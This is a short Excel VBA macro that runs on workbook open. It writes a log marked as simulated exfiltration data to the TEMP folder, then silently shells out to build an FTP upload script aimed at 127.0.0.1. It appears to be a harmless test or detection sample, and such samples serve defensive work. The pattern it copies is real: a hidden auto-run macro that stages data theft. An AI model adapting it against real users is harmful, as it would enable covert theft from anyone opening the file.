Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As Integer, logPath As String
    logPath = Environ("TEMP") & "\oblivionx_log.txt"
    jybosg1pnivrj = FreeFile
    Open logPath For Output As #jybosg1pnivrj
    Print #jybosg1pnivrj, "marker-ftp-log: simulated exfiltration data"
    Close #jybosg1pnivrj
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivionx_ftp.txt", 0
End Sub
